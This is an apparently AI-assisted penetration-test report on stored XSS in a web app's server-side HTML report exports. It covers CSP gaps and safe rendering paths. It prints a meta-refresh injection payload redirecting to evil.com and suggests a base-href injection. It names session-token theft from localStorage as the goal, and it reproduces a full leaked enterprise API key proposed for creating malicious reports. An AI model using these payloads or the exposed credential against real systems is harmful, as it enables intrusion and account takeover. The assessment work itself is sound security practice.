# Cross-Site Scripting (XSS) Analysis Report

**Assessment Date:** 2026-04-16
**Target:** http://host.docker.internal:8000
**Analyst Role:** XSS Analysis Specialist

---

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Five high-confidence stored XSS vulnerabilities were confirmed across multiple HTML report export endpoints. All findings have been passed to the exploitation phase via `deliverables/xss_exploitation_queue.json`. The application's React SPA frontend was found to use safe rendering patterns; the vulnerabilities reside entirely in the server-side Python HTML generation layer.
- **Purpose of this Document:** This report provides the strategic context, dominant vulnerability patterns, environmental intelligence (CSP analysis, cookie flags), confirmed CSP bypass techniques, and safe-path documentation necessary to effectively execute the exploitation phase.

**Confirmed Vulnerabilities:** 5 (all Stored XSS, HTML_BODY context, high confidence)
**Safe Paths Documented:** 7 (React SPA rendering is safe)

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: Unescaped Python f-String HTML Template Construction

**Description:** The most prevalent pattern across the codebase is server-side HTML generation using Python f-strings where user-controlled values (report names, titles, policy content) are interpolated directly into the HTML without calling `html.escape()`. This is a systemic failure — the Python standard library's `html.escape()` function is never imported or called in any of the five affected modules.

**Implication:** Any field that a user can supply to a report/policy creation API and that is subsequently rendered in an HTML export is exploitable. This pattern was confirmed in five separate modules: `reports_router.py`, `compliance_reports.py`, `report_builder.py`, `policy_generator.py`, and `generate_pentest_report.py`.

**Representative Findings:** XSS-VULN-01, XSS-VULN-02, XSS-VULN-03, XSS-VULN-04, XSS-VULN-05.

### Pattern 2: Markdown-to-HTML Converter Without HTML Escaping

**Description:** The policy generator implements a custom line-by-line Markdown-to-HTML converter in `policy_generator.py` that wraps each parsed line in HTML tags (`<h1>`, `<p>`, `<li>`, `<th>`, `<td>`) via f-strings. The converter uses regex to extract text but does not HTML-escape the extracted text before insertion.

**Implication:** An attacker who can set policy content (via `PUT /api/v1/policy-generator/policies/{id}/content`) can inject arbitrary HTML into every structural element produced by the converter — headings, paragraphs, list items, and table cells.

**Representative Finding:** XSS-VULN-04.

---

## 3. Strategic Intelligence for Exploitation

### Content Security Policy (CSP) Analysis

**Active CSP (for all `/api/*` routes, confirmed via live testing):**
```
content-security-policy: default-src 'none'; frame-ancestors 'none'
```

**SPA CSP (for non-API routes):**
```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self'; frame-ancestors 'none'
```

**Critical Analysis:**

The `default-src 'none'` CSP on API paths blocks `<script>alert()</script>` tags and inline event handlers (`onerror`, `onload`) in CSP-compliant modern browsers. This is the primary defensive control protecting the vulnerable HTML exports.

**CONFIRMED CSP BYPASS — Meta Refresh Redirect:**

Live testing confirmed that `<meta http-equiv="refresh">` tags injected into report titles are **not blocked by `default-src 'none'`**. Meta-refresh is a navigation directive; neither `default-src` nor any other CSP directive in the current policy governs it. The `navigate-to` CSP directive is absent.

**Live confirmation payload (executed in live app, report ID `414a28a2`):**
```
title value: SAFE TITLE</title><meta http-equiv="refresh" content="0;url=https://evil.com">
```
**Rendered in response (unescaped):**
```html
<title>SAFE TITLE</title><meta http-equiv="refresh" content="0;url=https://evil.com"></title>
<h1>SAFE TITLE</title><meta http-equiv="refresh" content="0;url=https://evil.com"></h1>
```
Any browser opening this export URL is silently redirected to the attacker-controlled domain.

**Additional CSP Gap — Base URI Not Restricted:**

No `base-uri` directive is present. A `<base href="https://attacker.com">` injection in the report title will change all relative URL resolutions in the document. While the current HTML templates are mostly self-contained, this provides further control over rendered document behavior.

**Enterprise Middleware CSP Note:**

A secondary middleware exists at `suite-core/core/enterprise/middleware.py` with a weaker policy (`script-src 'self' 'unsafe-inline'`). If this middleware is activated in enterprise deployments, it does NOT override the main middleware's API CSP (multiple CSP response headers are ANDed — most restrictive wins per directive). However, its presence signals that `unsafe-inline` is considered acceptable in some deployment configurations and may be present in non-standard deployments.

### Cookie / Token Security

**Method:** JWT-based authentication. Tokens are stored in `localStorage` under the keys `aldeci.authToken` and `aldeci.authStrategy`.

**Critical Implication:** Session tokens are NOT in HttpOnly cookies. They are stored in `localStorage` and are fully accessible to JavaScript (`window.localStorage.getItem('aldeci.authToken')`). A successful XSS that bypasses or does not require the CSP (e.g., in a deployment without the `default-src 'none'` API CSP, or in an open embedded frame) would allow direct exfiltration of the session JWT via `localStorage`.

**Exploitation Priority:** Identify deployments with the enterprise middleware's `unsafe-inline` CSP, or find a DOM-based XSS vector in the SPA path (where `script-src 'self'` applies and inline scripts are still blocked but `unsafe-inline` style injection is possible). Token theft via `localStorage` access should be the primary goal.

### Hardcoded API Key in Git History

During live testing, an enterprise API key was found in a script committed to the repository (`scripts/live_app_test.py`):
```
fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_
```
This key was used to confirm all three live-tested XSS vulnerabilities. The exploitation phase can use this credential to create malicious reports and share export URLs with victim users.

### Additional Security Headers

| Header | Value | Impact on XSS |
|--------|-------|---------------|
| `X-XSS-Protection` | `1; mode=block` | Legacy; Chrome 78+ removed auditor. No real protection. |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME-type sniffing of JSON responses. Effective. |
| `X-Frame-Options` | `DENY` | Prevents framing (CSP `frame-ancestors 'none'` also set). |

---

## 4. Vectors Analyzed and Confirmed Secure

These input vectors were traced and confirmed to have robust, context-appropriate defenses.

| Source (Parameter/Key) | Endpoint/Component | Defense Mechanism | Render Context | Verdict |
|---|---|---|---|---|
| Copilot LLM response (`msg.content`) | `CopilotSidebar.tsx:126` | React JSX text binding `{msg.content}` — automatic HTML escaping via text nodes | HTML_BODY | SAFE |
| SOC Dashboard alert data | `SOCDashboard.tsx:298-316` | Data is hardcoded mock/demo alert data; not user-controlled or DB-driven | HTML_BODY | SAFE (mock data) |
| E2E test `innerHTML = userInput` | `e2e/helpers/endpoints.ts:103` | Test fixture only; string is the *subject* of an API call to `/api/v1/autofix/generate`, not injected into DOM | HTML_BODY | SAFE (test-only) |
| `window.location.hash` | Multiple files (api.ts:98, auth.tsx:151) | Assignments are hardcoded literals (`"#/login"`); no user input involved | N/A | SAFE |
| AutoFix code output (`before`/`after`) | `AutoFix.tsx:92-126` | Rendered inside `<pre><code>{before}</code></pre>` via React text node binding | HTML_BODY | SAFE |
| Posture advisor recommendations | `PostureAdvisor.tsx` | Rendered as React text nodes in table cells and Badge components | HTML_BODY | SAFE |
| Search query parameters | Various API routes | API responses are `application/json` with `X-Content-Type-Options: nosniff`; reflection in JSON context | JSON | SAFE (JSON + nosniff) |

---

## 5. Analysis Constraints and Blind Spots

- **Report Builder Live Test Failed:** The `POST /api/v1/report-builder/templates` endpoint returned `405 Method Not Allowed` during live testing. XSS-VULN-05 (report builder) is based on unambiguous code analysis (`report_builder.py:582-607`) rather than live confirmation. Confidence remains HIGH.
- **Micro-Pentest Report Endpoint Not Reachable:** The `/api/v1/micro-pentest/report/view` endpoint returned 404. The vulnerability in `generate_pentest_report.py` (unescaped pentest result fields in HTML) could not be live-tested and is excluded from the exploitation queue pending further routing confirmation.
- **React SPA Client Code (Minified):** The built SPA assets were not analyzed as minified JavaScript. The source code analysis covered TypeScript sources; no additional DOM XSS sinks were found beyond those identified in the recon deliverable.
- **Enterprise Middleware Activation:** It could not be confirmed whether the enterprise middleware (`suite-core/core/enterprise/middleware.py`) is active in the live environment. If active, the weaker `unsafe-inline` CSP could enable full inline script execution on HTML export pages.
